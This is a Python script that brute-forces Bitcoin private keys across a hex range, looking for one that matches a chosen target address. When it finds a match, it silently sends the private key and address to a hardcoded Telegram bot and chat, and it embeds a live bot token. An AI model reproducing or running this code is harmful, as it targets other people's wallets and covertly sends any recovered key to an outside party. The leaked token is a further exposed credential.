import bitcoin
import hashlib
import requests
def generate_compressed_pubkey(private_key):
    # Generate the uncompressed public key
    uncompressed_pubkey = bitcoin.privtopub(private_key)
    
    # Compress the public key
    if uncompressed_pubkey[-1] in '02468ace':
        compressed_pubkey = '02' + uncompressed_pubkey[2:66]
    else:
        compressed_pubkey = '03' + uncompressed_pubkey[2:66]
    
    return compressed_pubkey

def generate_btc_address(private_key):
    # Generate the compressed public key from the private key
    compressed_pubkey = generate_compressed_pubkey(private_key)
    
    # Generate the P2PKH address from the compressed public key
    btc_address = bitcoin.pubtoaddr(compressed_pubkey)
    
    return btc_address

def generate_addresses_in_range(start_hex, end_hex,reach):
    start = int(start_hex, 16)
    end = int(end_hex, 16)
    
    for i in range(start, end + 1):
        private_key = '{:064x}'.format(i)
        btc_address = generate_btc_address(private_key)
        if btc_address == reach:
            # send telegram message
            url = f"https://api.telegram.org/bot{'6858253030:AAH_kXB9vs92ny_2XZk3w3tOgje8iQIJvaY'}/sendMessage?chat_id={'-1002212945063'}&text=Private Key: {private_key}\nBTC Address: {btc_address}"
            requests.get(url)
            print(f"Private Key: {private_key}")
            print(f"BTC Address: {btc_address}")
            print('---')

if __name__ == "__main__":
    # Define the range of private keys in hexadecimal format
    start_hex = input("Enter the start of the range (in hexadecimal): ")
    end_hex = input("Enter the end of the range (in hexadecimal): ")
    reach = input("Enter the address you want to reach:")
    generate_addresses_in_range(start_hex, end_hex, reach)